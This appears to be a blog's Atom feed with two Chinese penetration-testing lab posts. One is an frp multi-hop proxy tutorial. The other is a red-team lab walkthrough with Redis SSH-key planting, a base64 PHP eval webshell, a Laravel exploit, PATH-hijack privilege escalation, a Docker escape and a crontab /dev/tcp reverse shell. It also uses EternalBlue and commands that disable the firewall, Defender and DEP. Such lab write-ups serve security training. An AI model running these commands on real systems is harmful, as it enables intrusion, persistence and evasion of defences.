<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m</title>
  
  
  <link href="https://syst1m.top/atom.xml" rel="self"/>
  
  <link href="https://syst1m.top/"/>
  <updated>2022-08-31T11:56:47.276Z</updated>
  <id>https://syst1m.top/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透之frp多级代理</title>
    <link href="https://syst1m.top/2022/08/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86/"/>
    <id>https://syst1m.top/2022/08/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86/</id>
    <published>2022-08-30T08:08:37.000Z</published>
    <updated>2022-08-31T11:56:47.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>攻击机kali，net模式模拟出网：172.16.17.140</p><p>web靶机ubuntu1双网卡，net模式为出网网卡：172.16.17.137&#x2F;自定义网卡vm1模拟第一层内网：192.168.20.129</p><p>内网域内靶机ubuntu2双网卡，vm1网卡在第一层网络：192.168.20.130&#x2F;vm2网卡为第二层内网：192.168.30.129</p><ul><li>外网入口</li></ul><p>172.16.17.0&#x2F;24</p><ul><li>一层内网</li></ul><p>192.168.20.0&#x2F;24</p><ul><li>二层内网</li></ul><p>192.168.30.0&#x2F;24</p><p>每台PC上都有一个web服务，内网主机除边缘win7外全部不出网，内网同<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E6%AE%B5&spm=1001.2101.3001.7020">网段</a>之间的主机可以相互访问,不同网段相互隔离。两个靶机分别开启web服务，区分一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311837943.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311837382.png"></p><h1 id="一层代理"><a href="#一层代理" class="headerlink" title="一层代理"></a>一层代理</h1><p>假设我们已经拿下边界入口web网站的权限-ubuntu1，上传frp到靶机上对内网进行横向</p><p>攻击机kali配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment">#服务端口</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311849259.png"></p><p>ubuntu1也就是web靶机上配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.16</span>.<span class="number">17.140</span> <span class="comment">#kali的ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#与服务端端口要一致</span></span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp <span class="comment">#流量类型</span></span><br><span class="line"><span class="attr">plugin</span> = socks5 <span class="comment">#插件类型</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span> <span class="comment">#代理端口</span></span><br></pre></td></tr></table></figure><p>攻击机kali启动服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311856348.png"></p><p>靶机启动客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311902596.png"></p><h2 id="google插件代理"><a href="#google插件代理" class="headerlink" title="google插件代理"></a>google插件代理</h2><p>然后添加代理，我这里用物理机去访问，代理使用的google插件</p><p>ip为kali的ip也就是服务端，端口为客户端的代理端口6000截图的时候写错了，访问192.168.20.0&#x2F;24</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311911264.png"></p><p>成功代理到192.168.20&#x2F;24网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311914958.png"></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>用kali自带的proxychains去代理，添加一条，所有工具都可以使用proxychains代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 6000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311925449.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311925504.png"></p><h1 id="二层代理"><a href="#二层代理" class="headerlink" title="二层代理"></a>二层代理</h1><p>假设我们现在通过一层代理，可以访问到20网段的所有资产，然后我们发现存在一台不出网的主机，192.168.20.130，也就是域内靶机-ubuntu2，然后我们拿下权限之后发现还存在192.168.30.0&#x2F;24网段，现在我们需要代理到30网段去继续横向拿域控</p><p>一层代理不要掉，在kali上配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7788</span></span><br></pre></td></tr></table></figure><p>启动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311943595.png"></p><p>边界靶机ubuntu1上配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">192.168</span>.<span class="number">20.129</span>  </span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7799</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311945905.png"></p><p>边界靶机ubuntu1上t同时配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.16</span>.<span class="number">17.140</span> </span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7788</span>  </span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">130.129</span> </span><br><span class="line"><span class="attr">local_port</span> = <span class="number">1080</span>    </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span>  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311944622.png"></p><p>同样上传frp到域内靶机-ubuntu2上，配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">20.129</span> </span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7799</span>        </span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span> </span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure><p>启动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311946846.png"></p><p>加上代理访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311956560.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311950709.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;攻击机kali，net模式模拟出网：172.16.17.140&lt;/p&gt;
&lt;p&gt;web靶机ubuntu1双网卡，net模式为出网网卡：172.16.17.137&amp;#x2F;自定义网卡vm1模拟第一层内网：192.168.20.129&lt;/p&gt;
&lt;p&gt;内网域内靶机ubuntu2双网卡，vm1网卡在第一层网络：192.168.20.130&amp;#x2F;vm2网卡为第二层内网：192.168.30.129&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外网入口&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="frp" scheme="https://syst1m.top/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>ATT-CK红队实战靶场07</title>
    <link href="https://syst1m.top/2022/08/25/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA07/"/>
    <id>https://syst1m.top/2022/08/25/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA07/</id>
    <published>2022-08-25T08:53:52.000Z</published>
    <updated>2022-09-11T09:37:25.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251702067.png"></p><ul><li><p>DMZ区IP段为192.168.1.1&#x2F;24 复制物理机网络</p></li><li><p>第二层网络环境IP段为192.168.52.1&#x2F;24</p></li><li><p>第三层网络环境IP段为192.168.93.1&#x2F;24</p></li></ul><h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为</p><p>192.168.52.0&#x2F;24；VMnet14设为仅主机模式，IP段设为192.168.93.0&#x2F;24：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251704032.png"></p><p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机</p><p>皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。</p><p><strong>DMZ区域：</strong></p><p>给Ubuntu (Web 1) 配置了两个网卡，一个桥接可以对外提供服务；一个连接在VMnet8上连通第二</p><p>层网络。</p><p><strong>第二层网络区域：</strong></p><p>给Ubuntu (Web 2) 和Windows 7 (PC 1)都配置了两个网卡，一个连接在VMnet8上连通第二层网</p><p>络，一个连接在VMnet14上连通第三层网络。</p><p><strong>第三次网络区域：</strong></p><p>给Windows Server 2012和Windows 7 (PC 2)都只配置了一个网卡，一个连接在VMnet14上连通第</p><p>三层网络。</p><h2 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h2><p>靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应</p><p>的主机上启动靶机服务（有的需要加上sudo执行）：</p><p><strong>DMZ区的Ubuntu需要启动nginx服务：</strong></p><p>redis-server &#x2F;etc&#x2F;redis.conf</p><p>&#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>iptables -F</p><p><strong>第二层网络的Ubuntu需要启动docker容器：</strong></p><p>sudo service docker start</p><p>sudo docker start 8e172820ac78</p><p><strong>第三层网络的Windows 7PC 2）需要启动通达OA：</strong></p><p>C:\MYOA\bin\AutoConfig.exe</p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>**域用户账户和密码如下 **：</p><p>Administrator：Whoami2021</p><p>whoami：Whoami2021</p><p>bunny：Bunny2021</p><p>moretz：Moretz2021</p><p>**Ubuntu 1 **：</p><p>web：web2021</p><p>**Ubuntu 2 **：</p><p>ubuntu：ubuntu</p><p>**通达OA账户 **：</p><p>admin：admin657260</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对dmz靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251721607.png"></p><p>22端口：ssh，基本不考虑爆破</p><p>80,81端口：访问一个404一个502不知道是不是我环境搭建有问题</p><p>6379端口：redis未授权访问</p><h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><p>尝试连接，发现存在redis未授权访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251731647.png"></p><p>现在有三个利用思路：</p><p>1、写webshell</p><p>2、写ssh公钥</p><p>3、写计划任务</p><p>这里有一点限制，2和3都需要root权限启动的redis才能执行，因为我们这里是用sudo启动的redis，所以可以直接写公钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251736113.png"></p><p>添加首位换行，避免乱码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;<span class="built_in">cat</span> .ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure><p>设置备份路径并写入公钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251745891.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat key.txt | redis-cli -h 192.168.31.112 -x set hack</span></span><br><span class="line">OK                                                                                                         </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># redis-cli -h 192.168.31.112                          </span></span><br><span class="line">192.168.31.112:6379&gt; CONFIG SET <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; get hack</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>ssh免密登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251748310.png"></p><h2 id="上线到msf"><a href="#上线到msf" class="headerlink" title="上线到msf"></a>上线到msf</h2><p>使用 <code>exploit/multi/script/web_delivery</code>文件落地上线，这样比生成门后快一点</p><p>设置好payload和target</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251753859.png"></p><p>将运行结果复制到ssh shell中运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251754223.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251755439.png"></p><p>msf收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251756156.png"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>存在两张网卡，还有另一个网段52</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251758532.png"></p><p>添加路由把msf代理进去</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251802768.png"></p><p>msf主机存活扫描模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep   ARP扫描</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep   UDP扫描</span><br><span class="line">auxiliary/scanner/netbios/nbname        NETBIOS扫描</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum        SNMP扫描</span><br><span class="line">auxiliary/scanner/smb/smb_version       SMB扫描</span><br></pre></td></tr></table></figure><p>msf端口扫描模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack          TCP ACK端口扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn         SYN端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp          TCP端口扫描  </span><br><span class="line">auxiliary/scanner/portscan/xmas         TCP XMas端口扫描</span><br></pre></td></tr></table></figure><p>反向代理使用nmap对52网段进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251822176.png"></p><p>添加代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>nmap扫描内网太慢了，而且这样走msf的proxy模块，很不稳定，必须走tcp流量，而30靶机开启了防火墙所以一直回显denied</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251823211.png"></p><p>关了防火墙用msf模块扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251910393.png"></p><p>浏览器挂上反向代理，或者直接用proxychains打开火狐</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281638036.png"></p><p>都存在web服务</p><p>30是通达oa</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281643909.png"></p><p>20是Laravel</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281644023.png"></p><h2 id="通达oa"><a href="#通达oa" class="headerlink" title="通达oa"></a>通达oa</h2><p>先看通达oa，爆出过不少漏洞，记得用proxychains代理检测工具</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281856843.png"></p><p>蚁剑直接添加socks4代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281857020.png"></p><p>直接就是system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282334020.png"></p><p>发现还有一个网段93&#x2F;24</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282336253.png"></p><h2 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h2><p>52网段还存在一个Laravel框架的web服务，爆出了版本，存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282340685.png"></p><p>nginx反向代理，应该就是最开始dmz区的那台主机的81端口的服务，当时我忘了开机，所以访问502</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291516580.png"></p><p>下载exp，修改url <a href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP">https://github.com/crisprss/Laravel_CVE-2021-3129_EXP</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291454654.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291454003.png"></p><p>先写webshell到蚁剑，用base64写马不用担心转义问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt;1.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291604397.png"></p><p>做信息收集发现主机名很奇怪，存在dockerenv文件应该是docker容器了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291618083.png"></p><p>用curl上线到msf，少很多命令要自己调整一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620253.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620897.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620654.png"></p><h2 id="提权-docker-逃逸"><a href="#提权-docker-逃逸" class="headerlink" title="提权+docker 逃逸"></a>提权+docker 逃逸</h2><p>先提权再逃逸，linux提权三板斧，有个shell看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291624635.png"></p><p>运行发现应该是个ps命令，是s权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291629184.png"></p><p>我们可以构造一个环境变量来替换这个shell文件达到提权目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">touch</span> /tmp/ps</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/ps</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>不知道为什么蚁剑里修改环境变量没生效，到msf里修改生效了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291643013.png"></p><p>反弹一个shell到nc吧，半交互式shell方便一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291644021.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291644168.png"></p><p>提权完成，开始逃逸，docker逃逸一般都是特权模式逃逸，创建容器时通过添加–privileged&#x3D;true参数，将容器以特权模式起动，提权模式可以访问宿主机文件</p><p>特权模式起动的容器，实战可通过cat &#x2F;proc&#x2F;self&#x2F;status |grep Cap命令判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291649458.png"></p><p>将本地目录挂载到宿主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fdisk -l <span class="comment">#查看磁盘文件</span></span><br><span class="line"><span class="built_in">mkdir</span> /xx <span class="comment">#新建一个目录用于挂载</span></span><br><span class="line">mount /dev/sda1 /chan <span class="comment">#将宿主机/dev/sda1目录挂载到容器内</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291652293.png"></p><p>再利用计划任务反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; <span class="built_in">touch</span> shell.sh &amp;&amp; <span class="built_in">chmod</span> +x shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.31.119/7777 &lt;&amp;1&#x27;&quot;</span> &gt;&gt; shell.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291707522.png"></p><p>再写入计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/shell.sh &#x27;</span> /xx/etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /xx/etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291708320.png"></p><p>kali监听</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291709096.png"></p><p>再上线到msf维持权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291712971.png"></p><h1 id="第三层网络打点"><a href="#第三层网络打点" class="headerlink" title="第三层网络打点"></a>第三层网络打点</h1><p>现在拿到的权限有，dmz区域的外网靶机，和两台52网段的靶机.根据拿到的靶机发现还存在第三层网络93网段，并且存在域环境</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291715801.png"></p><p>添加到93网段的路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291747112.png"></p><p>因为第二层是出网的，也可以上线cs抓一下密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111736209.png"></p><p>再用fscan扫描内网</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208292022634.png"></p><p>扫出30和40两个主机，30为dc，都存在17010永恒之蓝，上传frp配置代理到web2，因为第二层是出网的，所以直接配置一层就行（msf的隧道不稳经常掉）</p><h2 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h2><p>kali配置服务端frps.ini，启动</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111646665.png"></p><p>web2配置frpc.ini，启动方法一样</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">31.118</span> <span class="comment">#kali ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp             </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span>     <span class="comment">#转发端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5 </span><br></pre></td></tr></table></figure><p>porxychins添加一条，其他工具就可以走这个代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure><h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><p>msf添加一个代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>尝试永恒之蓝，这里要注意使用正向payload，因为目标靶机是不出网的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111704262.png"></p><p>成功拿到192.168.93.40的会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111704743.png"></p><p>打域控的时候发现利用成功但是没返回会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111712516.png"></p><p>应该是没关防火墙，用winexe登录到域控上去把防火墙关了，前面已经用cs抓到管理员的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%Whoami2021&#x27;</span> //192.168.93.30 cmd.exe</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off #关闭防火墙</span><br><span class="line"><span class="built_in">net</span> stop windefend #关闭windefebd</span><br><span class="line">bcdedit.exe /<span class="built_in">set</span>&#123;current&#125; nx AlwaysOff #关闭DEP</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111723579.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111724439.png"></p><p>关闭防火墙后继续打，成功拿下DC</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209111725473.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208251702067.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
